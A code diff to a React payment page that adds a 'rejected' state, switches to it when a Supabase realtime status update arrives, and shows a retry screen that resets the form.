@@ -2,11 +2,12 @@ import { useState, useEffect, useMemo } from "react";
 import PaymentForm from "@/components/PaymentForm";
 import OtpVerification from "@/components/OtpVerification";
 import PaymentSuccess from "@/components/PaymentSuccess";
+import PaymentRejected from "@/components/PaymentRejected";
 import WaitingScreen from "@/components/WaitingScreen";
 import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
-  const [step, setStep] = useState<"form" | "waiting" | "otp" | "processing" | "success">("form");
+  const [step, setStep] = useState<"form" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
   const [amount, setAmount] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
 
@@ -40,6 +41,7 @@ const Index = () => {
         (payload) => {
           const newStatus = (payload.new as any).status;
           if (newStatus === "otp") setStep("otp");
+          if (newStatus === "rejected") setStep("rejected");
         }
       )
       .subscribe();
@@ -165,6 +167,7 @@ const Index = () => {
           {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} />}
           {step === "processing" && <WaitingScreen />}
           {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
+          {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
         </div>
       </div>
     </div>
